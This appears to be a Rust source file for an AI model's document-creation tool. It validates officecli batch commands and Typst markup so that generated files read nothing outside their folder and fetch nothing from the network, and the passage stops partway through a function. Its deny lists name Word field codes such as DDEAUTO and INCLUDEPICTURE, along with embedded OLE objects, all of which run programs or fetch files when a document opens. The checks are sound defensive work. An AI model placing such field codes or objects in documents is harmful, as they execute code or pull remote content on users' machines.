//! `create_document`, the host side: the model writes the content, the host
//! makes the file with a bundled engine in a private folder of the
//! conversation, checks it and keeps it as a generated attachment of the
//! reply. The result names the file's path and its first page's preview for
//! the runtime alone (see `assistant-runtime/src/document-tools.mjs`).
//!
//! What the engines print reaches the model and the reply's card only through
//! [`Work::shown`]: without the document's folder and without anything that
//! looks like a credential.
use super::{
    engines::Engines,
    runner::{run_engine, EngineOutput, ENGINE_TIMEOUT, OUTPUT_LIMIT, TYPST_PACKAGES},
};
use crate::services::assistant::{
    attachments,
    host::{blocking, scrub_secrets, scrub_secrets_in, AssistantHost, RunControl, PROTOCOL},
    media::UNKNOWN,
    media_tools::host::{fingerprint, still_running, MediaRun},
    store::AssistantStore,
    types::{id, now, MediaRecord},
};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};
use std::path::{Path, PathBuf};
use std::sync::Arc;

/// The engine failed, or refused the content; the message says why.
pub const FAILED: &str = "assistant_document_failed";
/// The reply already made [`MAX_DOCUMENTS_PER_RUN`] documents.
pub const LIMIT: &str = "assistant_document_limit";
/// `content` is over [`MAX_CONTENT_BYTES`].
pub const TOO_LARGE: &str = "assistant_document_too_large";
/// The format's engine is not on this computer.
const DISABLED: &str = "assistant_capability_disabled";
/// The most documents one reply may make.
pub const MAX_DOCUMENTS_PER_RUN: usize = 3;
/// The longest `content`, serialized.
pub const MAX_CONTENT_BYTES: usize = 2 * 1024 * 1024;
/// The most commands one Office document's batch may hold.
const MAX_COMMANDS: usize = 2000;
const MAX_NAME_CHARS: usize = 120;
/// The most issues a result and its card keep.
const MAX_ISSUES: usize = 20;
const MAX_ISSUE_CHARS: usize = 500;
const MAX_PATH_CHARS: usize = 200;
/// The runtime passes the model at most 2000 characters of an error: the
/// failure has to fit, its code included.
const MAX_ERROR_CHARS: usize = 1900;
/// An officecli failure lists this many of its failed commands, each in at
/// most [`MAX_FAILURE_CHARS`] characters of output.
const MAX_LISTED_FAILURES: usize = 5;
const MAX_FAILURE_CHARS: usize = 220;
/// How many problems `view issues` lists before identical ones are counted
/// together and the most important [`MAX_ISSUES`] are kept.
const VIEW_ISSUES_LIMIT: &str = "500";
/// Page setup, fonts and heading styles; the model writes only the body.
const PRELUDE: &str = include_str!("pdf-prelude.typ");
const MAIN: &str = "main.typ";
const BATCH: &str = "batch.json";
/// The engines' home and temp folder, inside the document's folder.
const HOME: &str = ".home";

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CreateDocumentArgs {
    pub name: String,
    pub format: DocumentFormat,
    pub content: Value,
}

#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum DocumentFormat {
    Pptx,
    Docx,
    Xlsx,
    Pdf,
    Md,
    Txt,
    Csv,
    Html,
    Json,
}

/// What makes a format's file.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Engine {
    Office,
    Typst,
    /// Written as the model wrote it.
    Text,
}

impl DocumentFormat {
    pub fn extension(self) -> &'static str {
        match self {
            Self::Pptx => "pptx",
            Self::Docx => "docx",
            Self::Xlsx => "xlsx",
            Self::Pdf => "pdf",
            Self::Md => "md",
            Self::Txt => "txt",
            Self::Csv => "csv",
            Self::Html => "html",
            Self::Json => "json",
        }
    }

    fn engine(self) -> Engine {
        match self {
            Self::Pptx | Self::Docx | Self::Xlsx => Engine::Office,
            Self::Pdf => Engine::Typst,
            _ => Engine::Text,
        }
    }

    /// What a file of this format is counted in, when it is.
    fn count(self) -> Option<&'static str> {
        match self {
            Self::Pptx => Some("slides"),
            Self::Xlsx => Some("sheets"),
            Self::Pdf => Some("pages"),
            _ => None,
        }
    }

    /// The file the engine writes in the document's folder. The model's name
    /// is only the attachment's: it never reaches an engine's arguments.
    fn file(self) -> String {
        format!("out.{}", self.extension())
    }
}

/// A call whose arguments passed the checks.
#[derive(Clone)]
struct Document {
    name: String,
    format: DocumentFormat,
    content: Content,
}

#[derive(Clone)]
enum Content {
    /// An officecli batch.
    Commands(Vec<Value>),
    /// Typst markup, or the text of a text file.
    Text(String),
}

impl Document {
    fn new(args: CreateDocumentArgs) -> Result<Self, String> {
        let size = serde_json::to_vec(&args.content)
            .map_err(|_| PROTOCOL)?
            .len();
        if size > MAX_CONTENT_BYTES {
            return Err(refuse(
                TOO_LARGE,
                format!("content is {size} bytes, over the 2 MiB limit; make the document shorter"),
            ));
        }
        let format = args.format;
        let extension = format.extension();
        let content = match (format.engine(), args.content) {
            (Engine::Office, Value::Array(mut commands)) => {
                check_batch(&mut commands)?;
                Content::Commands(commands)
            }
            (Engine::Office, _) => {
                return Err(refuse(
                    FAILED,
                    format!("{extension} content must be an array of officecli batch commands"),
                ))
            }
            (Engine::Typst, Value::String(body)) if imports_a_package(&body) => {
                return Err(refuse(
                    FAILED,
                    "Typst packages are not available: write the body without #import or #include of \"@…\" packages",
                ))
            }
            (Engine::Typst, Value::String(body)) => Content::Text(body),
            (Engine::Typst, _) => {
                return Err(refuse(FAILED, "pdf content must be a string of Typst markup"))
            }
            (Engine::Text, Value::String(text)) => Content::Text(text),
            (Engine::Text, _) => {
                return Err(refuse(
                    FAILED,
                    format!("{extension} content must be a string with the file's text"),
                ))
            }
        };
        Ok(Self {
            name: file_name(&args.name, format),
            format,
            content,
        })
    }
}

/// The commands a batch may hold: they change the document and nothing else.
/// The host validates and views the file itself.
const COMMANDS: &[&str] = &["add", "set", "remove", "move", "swap"];
/// The fields a command may carry (`op` is officecli's alias of `command`,
/// `path2` the second element of a swap).
const FIELDS: &[&str] = &[
    "command", "op", "parent", "path", "path2", "type", "props", "after", "before", "index",
    "from", "to", "selector",
];
/// The fields that name an element of the document, never a file.
const ELEMENT_FIELDS: &[&str] = &[
    "parent", "path", "path2", "after", "before", "from", "to", "selector",
];
/// Properties officecli reads as a file (`officecli help`: `src` and its
/// alias `path`, a fill or cell `image`, an OLE `preview`, a picture
/// `fallback`, a media `poster`), and names a file could go by: a data URI
/// only. A dotted key is a file's when any part of it is.
const FILE_KEYS: &[&str] = &[
    "src", "path", "image", "preview", "fallback", "poster", "file", "source", "icon", "logo",
    "video", "audio", "model", "ole",
];
/// Click targets: a web or mail address, or an element of the document.
const LINK_KEYS: &[&str] = &["link", "hyperlink", "url", "href"];
/// Prose: any value, so that text may hold addresses and slashes. Only
/// these exact keys.
const PROSE_KEYS: &[&str] = &[
    "text",
    "title",
    "notes",
    "alt",
    "description",
    "tooltip",
    "value",
    "formula",
];
/// Names a sheet may not root an element path with: file systems' first
/// folders.
const FOLDER_NAMES: &[&str] = &[
    "users",
    "volumes",
    "windows",
    "program files",
    "programdata",
    "applications",
    "library",
    "system",
    "private",
    "etc",
    "var",
    "tmp",
    "usr",
    "bin",
    "opt",
    "home",
    "root",
    "mnt",
    "media",
    "dev",
    "proc",
    "sys",
    "boot",
    "srv",
    "run",
    "sbin",
    "lib",
    "cores",
    "snap",
    "nix",
];
/// The first segment of an element path, besides a sheet's name.
const ROOTS: &[&str] = &[
    "body",
    "header",
    "footer",
    "comments",
    "footnotes",
    "endnotes",
    "styles",
    "settings",
    "numbering",
    "theme",
    "slide",
    "slidemaster",
    "slidelayout",
    "notes",
    "sheet",
];

/// What a property may hold.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Property {
    File,
    Link,
    /// A table's inline CSV.
    Data,
    Prose,
    /// A fill, gradient or background: colours, a gradient, or an image.
    Fill,
    NumberFormat,
    Other,
}

/// The class of a property by its key.
fn property(key: &str) -> Property {
    let key = key.to_ascii_lowercase();
    let last = key.rsplit('.').next().unwrap_or(&key);
    if key.split('.').any(|part| FILE_KEYS.contains(&part)) {
        Property::File
    } else if LINK_KEYS.contains(&last) {
        Property::Link
    } else if key == "data" {
        Property::Data
    } else if PROSE_KEYS.contains(&key.as_str()) {
        Property::Prose
    } else if matches!(last, "gradient" | "background") || last.ends_with("fill") {
        Property::Fill
    } else if matches!(key.as_str(), "numberformat" | "numfmt") {
        Property::NumberFormat
    } else {
        Property::Other
    }
}

/// A batch officecli may run: commands that change the document, whose
/// values read nothing outside the document's folder and fetch nothing (a
/// picture or any other file comes as a `data:` URI). A diagram is drawn
/// with shapes: officecli would otherwise render it in a browser it starts,
/// with mermaid.js from the network.
fn check_batch(commands: &mut [Value]) -> Result<(), String> {
    if commands.is_empty() {
        return Err(refuse(
            FAILED,
            "the batch is empty: content must hold at least one command",
        ));
    }
    if commands.len() > MAX_COMMANDS {
        return Err(refuse(
            FAILED,
            format!("at most {MAX_COMMANDS} commands per document"),
        ));
    }
    // The sheets an xlsx path may start with: the first one, and those the
    // batch adds or renames.
    let mut sheets = vec!["sheet1".to_owned()];
    for (index, item) in commands.iter_mut().enumerate() {
        let problem = |why: &str| refuse(FAILED, format!("item {index}: {why}"));
        let Some(fields) = item.as_object_mut() else {
            return Err(problem(
                "each command is an object with a \"command\" field",
            ));
        };
        let verb = match (
            fields.get("command").and_then(Value::as_str),
            fields.get("op").and_then(Value::as_str),
        ) {
            (Some(verb), None) | (None, Some(verb)) => verb.to_ascii_lowercase(),
            (Some(verb), Some(op)) if verb.eq_ignore_ascii_case(op) => verb.to_ascii_lowercase(),
            _ => {
                return Err(problem(
                    "each command is an object with a \"command\" field",
                ))
            }
        };
        if !COMMANDS.contains(&verb.as_str()) {
            return Err(problem(&format!(
                "\"{verb}\" is not available; a batch uses {}",
                COMMANDS.join(", ")
            )));
        }
        if let Some(field) = fields.keys().find(|key| !FIELDS.contains(&key.as_str())) {
            return Err(problem(&format!(
                "unknown field \"{field}\"; a command takes {}",
                FIELDS.join(", ")
            )));
        }
        if let Some(why) = refused_shape(fields) {
            return Err(problem(&why));
        }
        for (field, value) in fields.iter() {
            let why = if ELEMENT_FIELDS.contains(&field.as_str()) {
                let anchor = matches!(field.as_str(), "after" | "before");
                match value {
                    Value::String(text) if names_an_element(text, anchor, &sheets) => None,
                    Value::Number(_) => None,
                    _ => Some((
                        field.clone(),
                        "must name an element of the document, such as /slide[1]/shape[2]",
                    )),
                }
            } else {
                // `props` by each key's class; `type` and the verb as others.
                refused_property(field.clone(), value, Property::Other)
            };
            if let Some((key, why)) = why {
                return Err(problem(&format!("\"{key}\" {why}")));
            }
        }
        let kind = element_type(fields);
        let name = fields
            .get("props")
            .and_then(|props| props.get("name"))
            .and_then(Value::as_str);
        let renamed = verb == "set"
            && fields
                .get("path")
                .and_then(Value::as_str)
                .and_then(|path| path.strip_prefix('/'))
                .is_some_and(|sheet| sheets.contains(&sheet.to_lowercase()));
        let added = verb == "add" && kind == "sheet";
        if let Some(name) = name.filter(|name| (renamed || added) && may_root(name)) {
            sheets.push(name.to_lowercase());
        }
    }
    Ok(())
}

/// Element types a batch may not add: a diagram (officecli renders it in a
/// browser it starts, with mermaid.js from the network), an embedded
/// object or package (an executable inside the document).
const REFUSED_TYPES: &[&str] = &[
    "diagram",
    "flowchart",
    "ole",
    "oleobject",
    "object",
    "embed",
    "package",
];
/// The Word fields a document may hold: they show a number or a date, and
/// run nothing.
const FIELD_NAMES: &[&str] = &["page", "numpages", "date", "time", "toc"];
/// Field instructions that run a program, or fetch a file, when Word opens
/// the document.
const FIELD_CODES: &[&str] = &["DDEAUTO", "DDE ", "INCLUDEPICTURE", "INCLUDETEXT"];

/// An item's `type`, as officecli compares it.
fn element_type(fields: &Map<String, Value>) -> String {
    fields
        .get("type")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .trim()
        .to_ascii_lowercase()
}

/// Why an item's shape is refused, if it is: a `type` that is not a word,
/// or one a batch may not add; `props` that are not one object of scalars
/// with distinct ASCII keys (officecli also takes `["key=value"]` arrays and
/// keeps the last of two keys that differ in case); a field other than
/// [`FIELD_NAMES`]; a field instruction of [`FIELD_CODES`] anywhere.
fn refused_shape(fields: &Map<String, Value>) -> Option<String> {
    if let Some(kind) = fields.get("type") {
        let Some(kind) = kind.as_str().filter(|kind| {
            !kind.is_empty()
                && kind
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || "-_".contains(c))
        }) else {
            return Some("\"type\" must be an element type such as slide or paragraph".into());
        };
        if REFUSED_TYPES.contains(&kind.to_ascii_lowercase().as_str()) {
            return Some(format!("\"{kind}\" elements cannot be added here"));
        }
    }
    let empty = Map::new();
    let props = match fields.get("props") {
        None => &empty,
        Some(Value::Object(props)) => props,
        Some(_) => return Some("\"props\" must be an object of property names and values".into()),
    };
    let mut seen = std::collections::HashSet::new();
    for (key, value) in props {
        if key.is_empty() || !key.is_ascii() {
            return Some(format!("\"props.{key}\" is not a property name"));
        }
        if !seen.insert(key.to_ascii_lowercase()) {
            return Some(format!("\"props.{key}\" is given twice"));
        }
        if value.is_object() || value.is_array() {
            return Some(format!("\"props.{key}\" must be a single value"));
        }
        let text = value.as_str().unwrap_or_default().to_ascii_uppercase();
        if FIELD_CODES.iter().any(|code| text.contains(code)) {
            return Some(format!(
                "\"props.{key}\" holds a field instruction that runs or fetches something"
            ));
        }
    }
    // A field's name, wherever officecli reads one.
    let field = element_type(fields) == "field";
    let named: &[&str] = if field {
        &["instruction", "instr", "code", "field", "fieldtype", "type"]
    } else {
        &["instruction", "instr", "field"]
    };
    let names: Vec<(&String, &Value)> = props
        .iter()
        .filter(|(key, _)| named.contains(&key.to_ascii_lowercase().as_str()))
        .collect();
    let allowed = |value: &Value| {
        value
            .as_str()
            .is_some_and(|name| FIELD_NAMES.contains(&name.trim().to_ascii_lowercase().as_str()))
    };
    if (field && names.is_empty()) || names.iter().any(|(_, value)| !allowed(value)) {
        return Some("a field can only be page, numpages, date, time or toc".into());
    }
    None
}

/// The first value under `value` (named `key`, of class `class`) that its
/// property may not hold, and why. An object's values take their own keys'
/// classes; an array's values take the array's.
fn refused_property(key: String, value: &Value, class: Property) -> Option<(String, &'static str)> {
    match value {
        Value::String(text) => refused_value(text, class).map(|why| (key, why)),
        Value::Object(map) => map.iter().find_map(|(name, value)| {
            refused_property(format!("{key}.{name}"), value, property(name))
        }),
        Value::Array(items) => items
            .iter()
            .enumerate()
            .find_map(|(at, value)| refused_property(format!("{key}[{at}]"), value, class)),
        _ => None,
    }
}

/// Why a property of `class` may not hold `text`, if it may not.
fn refused_value(text: &str, class: Property) -> Option<&'static str> {
    let text = text.trim();
    let lower = text.to_ascii_lowercase();
    let elsewhere = "names a file or an address; only data: URIs can be used";
    match class {
        Property::File => (!is_data_uri(text)).then_some(
            "must be a data: URI (data:<type>;base64,…); files and addresses cannot be used",
        ),
        Property::Link => (!["https://", "http://", "mailto:"]
            .iter()
            .any(|scheme| lower.starts_with(scheme))
            && !links_a_slide(text))
        .then_some("must be an https:, http: or mailto: address, or slide[n]"),
        Property::Data => data_reaches_out(text)
            .then_some("must be the table's rows inline (CSV); files and addresses cannot be used"),
        Property::Prose => None,
        Property::Fill if lower.starts_with("image:") => {
            (!is_data_uri(&text[6..])).then_some("may name an image only as a data: URI")
        }
        Property::Fill if lower.starts_with("linear:") || lower.starts_with("radial:") => {
            let colours = &text[7..];
            (colours.is_empty()
                || !colours
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || "#,;-. ".contains(c)))
            .then_some("a gradient takes colours only")
        }
        // `hh:mm`, `[h]:mm:ss`: a colon after date and time codes is no
        // scheme; every other check holds.
        Property::NumberFormat => location(text, |token| {
            is_scheme(token)
                && !token
                    .chars()
                    .all(|c| "hmsdy".contains(c.to_ascii_lowercase()))
        })
        .then_some(elsewhere),
        Property::Fill | Property::Other => names_a_location(text).then_some(elsewhere),
    }
}

/// A scheme's name: a letter, then letters, digits, `+`, `.` or `-`.
fn is_scheme(name: &str) -> bool {
    name.starts_with(|c: char| c.is_ascii_alphabetic())
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "+.-".contains(c))
}

/// A value that names a place outside the document: once `\` reads as `/`,
/// it starts with `/` or `~`, or with `.` unless it is a number (`.5in`),
/// has a `..` segment, or starts with a drive or a scheme other than
/// `data:`. A cell range (`E2:L18`) is none.
fn names_a_location(text: &str) -> bool {
    location(text, is_scheme)
}

/// [`names_a_location`], with `scheme` deciding which token before a colon
/// is a scheme's (or a drive's) name.
fn location(text: &str, scheme: impl Fn(&str) -> bool) -> bool {
    let path = text.trim().replace('\\', "/");
    let lower = path.to_ascii_lowercase();
    let unsigned = path.strip_prefix('-').unwrap_or(&path);
    let number = unsigned
        .strip_prefix('.')
        .unwrap_or(unsigned)
        .starts_with(|c: char| c.is_ascii_digit());
    let scheme = lower.split_once(':').is_some_and(|(name, _)| scheme(name));
    path.starts_with(['/', '~'])
        || (path.starts_with('.') && !number)
        || path.split('/').any(|part| part.trim() == "..")
        || (scheme && !is_data_uri(&path) && !is_cell_range(&path))
}

/// Whether a table's `data` would be read as a file or an address rather
/// than as inline CSV: it starts like a path (`/`, `\`, `~`, `.`, `@`, a
/// drive), it is an address, or, without a comma, semicolon or line break,
/// it is a single path or scheme. `a:b,c` is a row.
fn data_reaches_out(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let bytes = text.as_bytes();
    let drive = bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && matches!(bytes[2], b'/' | b'\\');
    let single = !text.contains([',', ';', '\n']);
    // `a,b/../../x` climbs out of the folder too: .NET folds `b/..` away.
    let climbs = text
        .replace('\\', "/")
        .split(['/', ',', ';', '\n', '\r', '\t'])
        .any(|part| part.trim() == "..");
    climbs
        || text.starts_with(['/', '\\', '~', '.', '@'])
        || drive
        || lower
            .split_once("://")
            .is_some_and(|(name, _)| is_scheme(name))
        || lower.starts_with("file:")
        || (single
            && lower
                .split_once(':')
                .is_some_and(|(name, _)| is_scheme(name)))
}

/// One cell: one to three letters and a row number (`B12`).
fn is_cell(text: &str) -> bool {
    let letters = text.chars().take_while(char::is_ascii_alphabetic).count();
    let digits = &text[letters..];
    (1..=3).contains(&letters)
        && (1..=7).contains(&digits.len())
        && digits.chars().all(|c| c.is_ascii_digit())
}

/// `A1:C3`: two cells.
fn is_cell_range(text: &str) -> bool {
    text.split_once(':')
        .is_some_and(|(start, end)| is_cell(start) && is_cell(end))
}

/// An in-deck link target: `slide[n]` or `/slide[n]`, optionally followed
/// by `/shape[…]`.
fn links_a_slide(text: &str) -> bool {
    let text = text.strip_prefix('/').unwrap_or(text);
    let (slide, shape) = match text.split_once('/') {
        Some((slide, shape)) => (slide, Some(shape)),
        None => (text, None),
    };
    let inner = |segment: &'_ str, name: &str| -> Option<String> {
        segment
            .strip_prefix(name)
            .and_then(|rest| rest.strip_prefix('['))
            .and_then(|rest| rest.strip_suffix(']'))
            .filter(|inner| !inner.contains(['[', ']']))
            .map(str::to_owned)
    };
    inner(slide, "slide").is_some_and(|n| !n.is_empty() && n.chars().all(|c| c.is_ascii_digit()))
        && shape.is_none_or(|shape| inner(shape, "shape").is_some_and(|p| predicate(&p)))
}

/// Whether a sheet the batch makes may start an element path: not a file
/// system's first folder, and nothing that separates a path.
fn may_root(name: &str) -> bool {
    !name.contains(['/', '\\', ':']) && !FOLDER_NAMES.contains(&name.to_lowercase().as_str())
}

/// `data:<type>/<subtype>[;…];base64,…`.
fn is_data_uri(text: &str) -> bool {
    let lower = text.trim().to_ascii_lowercase();
    let Some((head, _)) = lower
        .strip_prefix("data:")
        .and_then(|rest| rest.split_once(','))
    else {
        return false;
    };
    let mut parts = head.split(';');
    let media = parts.next().unwrap_or_default();
    let valid = |part: &str| {
        !part.is_empty()
            && part
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "+.-_".contains(c))
    };
    media
        .split_once('/')
        .is_some_and(|(kind, sub)| valid(kind) && valid(sub))
        && head.ends_with(";base64")
}

/// An element as officecli names it: `/`, or a known root and segments
/// (`/slide[1]/shape[2]`, `/body/p[last()]`, `/销售/A1:C3` for a sheet in
/// `sheets`); a selector without `/` (`shape`, `p[@paraId=1A2B3C4D]`,
/// `Sheet1!A1`); or for `after`/`before` a `find:<text>` anchor.
fn names_an_element(text: &str, anchor: bool, sheets: &[String]) -> bool {
    if anchor && text.starts_with("find:") {
        return true;
    }
    match text.strip_prefix('/') {
        Some("") => true,
        Some(rest) => element_segments(rest, sheets),
        None => {
            !text.trim().is_empty()
                && !text.contains(['/', '\\'])
                && !text.starts_with(['.', '~'])
                && !text.contains("..")
                && !names_a_location(text)
                && predicates(text).is_some_and(|found| found.into_iter().all(predicate))
        }
    }
}

/// The contents of `text`'s `[…]` predicates; `None` when one is not closed
/// or holds another.
fn predicates(text: &str) -> Option<Vec<&str>> {
    let mut found = vec![];
    let mut rest = text;
    while let Some(open) = rest.find('[') {
        let close = rest[open..].find(']')? + open;
        let inner = &rest[open + 1..close];
        if inner.contains('[') {
            return None;
        }
        found.push(inner);
        rest = &rest[close + 1..];
    }
    (!rest.contains(']')).then_some(found)
}

/// A predicate officecli takes (`1`, `last()`, `@name=Plan`, `@paraId=…`):
/// letters, digits, `_@=()-.` and spaces, and quoted strings without `/`,
/// `\` or `:`.
fn predicate(inner: &str) -> bool {
    let mut quote = None;
    inner.chars().all(|c| match quote {
        Some(open) if c == open => {
            quote = None;
            true
        }
        Some(_) => !matches!(c, '/' | '\\' | ':') && !c.is_control(),
        None if c == '"' || c == '\'' => {
            quote = Some(c);
            true
        }
        None => c.is_ascii_alphanumeric() || "_@=()-. ".contains(c),
    }) && quote.is_none()
}

/// `slide[1]/shape[@name=Title]`: a known root, or a sheet of `sheets`
/// followed by nothing or by a cell, a range, a row, a column, a table or a
/// chart; then names of letters, digits, `_`, `-` and spaces (a cell range
/// joins two with `:`), each with any predicates. A predicate holds no `/`.
fn element_segments(path: &str, sheets: &[String]) -> bool {
    let word = |word: &str| {
        word.starts_with(|c: char| c.is_alphanumeric() || c == '_')
            && word
                .chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '_' | '-' | ' '))
    };
    let segments: Vec<(&str, &str)> = path
        .split('/')
        .map(|segment| segment.split_at(segment.find('[').unwrap_or(segment.len())))
        .collect();
    let valid = segments.iter().all(|(name, rest)| {
        let named = match name.split_once(':') {
            Some((start, end)) => word(start) && word(end),
            None => word(name),
        };
        named && bracketed(rest).is_some_and(|found| found.into_iter().all(predicate))
    });
    let root = segments[0].0.to_lowercase();
    let sheet_part = |(name, rest): &(&str, &str)| {
        let part = name.to_lowercase();
        (rest.is_empty() && (is_cell(name) || is_cell_range(name)))
            || (!rest.is_empty() && matches!(part.as_str(), "row" | "col" | "tbl" | "chart"))
    };
    let rooted = ROOTS.contains(&root.as_str())
        || (sheets.contains(&root) && segments.get(1).is_none_or(sheet_part));
    valid && rooted
}

/// `[a][b]` as `a` and `b`; `None` unless `text` is only such groups.
fn bracketed(text: &str) -> Option<Vec<&str>> {
    let mut found = vec![];
    let mut rest = text;
    while !rest.is_empty() {
        let inner = rest.strip_prefix('[')?;
        let close = inner.find(']')?;
        if inner[..close].contains('[') {
            return None;
        }
        found.push(&inner[..close]);
        rest = &inner[close + 1..];
    }
    Some(found)
}

/// Whether a Typst body imports or includes a package, which would be
/// fetched from the network.
fn imports_a_package(body: &str) -> bool {
    body.contains("@preview/")
        || body.contains("@local/")
        || ["import", "include"].iter().any(|keyword| {
            body.match_indices(keyword)
                .any(|(at, _)| body[at + keyword.len()..].trim_start().starts_with("\"@"))
        })
}

/// `raw` as a file name of `format`: its last path segment, without control
/// or reserved characters and leading dots, with the format's extension in
/// place of any it had; at most [`MAX_NAME_CHARS`] characters.
fn file_name(raw: &str, format: DocumentFormat) -> String {
    let last = raw.rsplit(['/', '\\']).next().unwrap_or_default();
    let printable: String = last
        .chars()
        .filter(|c| {
            !c.is_control()
                && !matches!(c, '<' | '>' | ':' | '"' | '|' | '?' | '*')
                && !matches!(c, '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}')
        })
        .collect();
    let trimmed = printable
        .trim_start_matches(|c: char| c == '.' || c.is_whitespace())
        .trim_end();
    let stem = match trimmed.rsplit_once('.') {
        Some((stem, extension))
            if !stem.trim().is_empty()
                && (1..=5).contains(&extension.len())
                && extension.chars().all(|c| c.is_ascii_alphanumeric()) =>
        {
            stem
        }
        _ => trimmed,
    };
    let extension = format.extension();
    let stem: String = stem
        .chars()
        .take(MAX_NAME_CHARS - extension.len() - 1)
        .collect();
    let stem = stem.trim_end_matches(|c: char| c == '.' || c.is_whitespace());
    let stem = if stem.is_empty() { "document" } else { stem };
    format!("{stem}.{extension}")
}

/// How many pages a PDF has: its page dictionaries (`/Type /Page`, not the
/// `/Pages` tree or a `/PageLabel`). Typst writes them uncompressed.
fn pdf_pages(bytes: &[u8]) -> Option<u64> {
    const TYPE: &[u8] = b"/Type";
    let delimiter = |b: u8| b.is_ascii_whitespace() || b"/<>[](){}%".contains(&b);
    let mut count = 0;
    let mut at = 0;
    while let Some(found) = bytes[at..].windows(TYPE.len()).position(|w| w == TYPE) {
        at += found + TYPE.len();
        let rest = &bytes[at..];
        let start = rest
            .iter()
            .position(|b| !b.is_ascii_whitespace())
            .unwrap_or(rest.len());
        let name = &rest[start..];
        if name.starts_with(b"/Page") && name.get(5).is_none_or(|b| delimiter(*b)) {
            count += 1;
        }
    }
    (count > 0).then_some(count)
}

/// One problem a document's checks found.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
struct Issue {
    severity: &'static str,
    message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    path: Option<String>,
}

impl Issue {
    fn warning(message: String, path: Option<String>) -> Self {
        Self {
            severity: "warning",
            message,
            path,
        }
    }
}

/// officecli's severities: 0 error, 1 warning, 2 info, or their names.
fn severity(value: &Value) -> &'static str {
    match value {
        Value::Number(n) => match n.as_u64() {
            Some(0) => "error",
            Some(1) => "warning",
            _ => "info",
        },
        Value::String(name) => match name.to_ascii_lowercase().as_str() {
            "error" | "critical" | "fatal" => "error",
            "info" | "information" | "hint" | "notice" => "info",
            _ => "warning",
        },
        _ => "warning",
    }
}

/// The issues a result and its card keep: identical ones once, with how
/// often they occur; errors first; at most [`MAX_ISSUES`], each bounded.
fn finished(found: Vec<Issue>) -> Vec<Issue> {
    let mut groups: Vec<(Issue, usize)> = vec![];
    for issue in found {
        match groups
            .iter_mut()
            .find(|(first, _)| first.severity == issue.severity && first.message == issue.message)
        {
            Some((_, count)) => *count += 1,
            None => groups.push((issue, 1)),
        }
    }
    let mut issues: Vec<Issue> = groups
        .into_iter()
        .map(|(mut issue, count)| {
            if count > 1 {
                issue.message = format!("{} ({count} places)", issue.message);
                issue.path = None;
            }
            issue
        })
        .collect();
    let rank = |severity: &str| match severity {
        "error" => 0,
        "warning" => 1,
        _ => 2,
    };
    issues.sort_by_key(|issue| rank(issue.severity));
    issues.truncate(MAX_ISSUES);
    for issue in &mut issues {
        issue.message = clip(&issue.message, MAX_ISSUE_CHARS);
        issue.path = issue.path.as_deref().map(|path| clip(path, MAX_PATH_CHARS));
    }
    issues
}

/// At most `max` characters of `text`.
fn clip(text: &str, max: usize) -> String {
    if text.chars().count() <= max {
        return text.to_owned();
    }
    let mut clipped: String = text.chars().take(max.saturating_sub(1)).collect();
    clipped.push('…');
    clipped
}

/// `text` without officecli's "Run 'officecli help …'" advice: the model
/// cannot run it.
fn without_help(text: &str) -> String {
    let mut text = text.to_owned();
    while let Some(start) = ["Run '", "Run `"]
        .iter()
        .filter_map(|hint| text.find(hint))
        .min()
    {
        let end = text[start..]
            .find(". ")
            .map_or(text.len(), |at| start + at + 2);
        text.replace_range(start..end, "");
    }
    text.trim().to_owned()
}

/// A refusal the model can act on: `<code>: <what to change>`.
fn refuse(code: &str, why: impl AsRef<str>) -> String {
    format!("{code}: {}", why.as_ref())
}

/// The engine a format needs, `None` for text; refused when it is missing.
fn engine_for(format: DocumentFormat, engines: &Engines) -> Result<Option<PathBuf>, String> {
    let engine = match format.engine() {
        Engine::Office => &engines.officecli,
        Engine::Typst => &engines.typst,
        Engine::Text => return Ok(None),
    };
    engine.clone().map(Some).ok_or_else(|| {
        refuse(
            DISABLED,
            format!(
                "{} files cannot be made on this computer",
                format.extension()
            ),
        )
    })
}

/// A new private folder for one document, its engines' home, and the
/// content where the engine reads it (or, for text, the file itself).
/// Blocking file IO.
fn prepare(
    store: &AssistantStore,
    sid: &str,
    document: &Document,
    language: &str,
) -> Result<(PathBuf, PathBuf), String> {
    let dir = store.outputs_dir(sid, &id())?;
    let home = dir.join(HOME);
    crate::config::create_private_dir_all(&home).map_err(|_| unwritable())?;
    match (&document.content, document.format.engine()) {
        (Content::Commands(commands), _) => write_new(
            &dir.join(BATCH),
            &serde_json::to_vec(commands).map_err(|_| PROTOCOL)?,
        )?,
        (Content::Text(body), Engine::Typst) => {
            let prelude = PRELUDE.replace("{{LANG}}", language);
            write_new(&dir.join(MAIN), format!("{prelude}{body}").as_bytes())?;
            seal_packages(&home)?;
        }
        (Content::Text(text), _) => write_new(&dir.join(document.format.file()), text.as_bytes())?,
    }
    Ok((dir, home))
}

fn unwritable() -> String {
    refuse(FAILED, "the document's folder could not be written")
}

/// Write a file that must not exist yet, private on Unix.
fn write_new(path: &Path, bytes: &[u8]) -> Result<(), String> {
    use std::io::Write;
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    options
        .open(path)
        .and_then(|mut file| file.write_all(bytes))
        .map_err(|_| unwritable())
}

/// Typst looks for packages, and caches downloads, only in `home`'s package
/// folder (see the runner), which is read-only: a downloaded package is not
/// kept. The download itself is stopped by the runner's dead proxy and, on
/// macOS, by [`TYPST_SANDBOX`]; a body that names a package is refused
/// before Typst starts.
fn seal_packages(home: &Path) -> Result<(), String> {
    let packages = home.join(TYPST_PACKAGES);
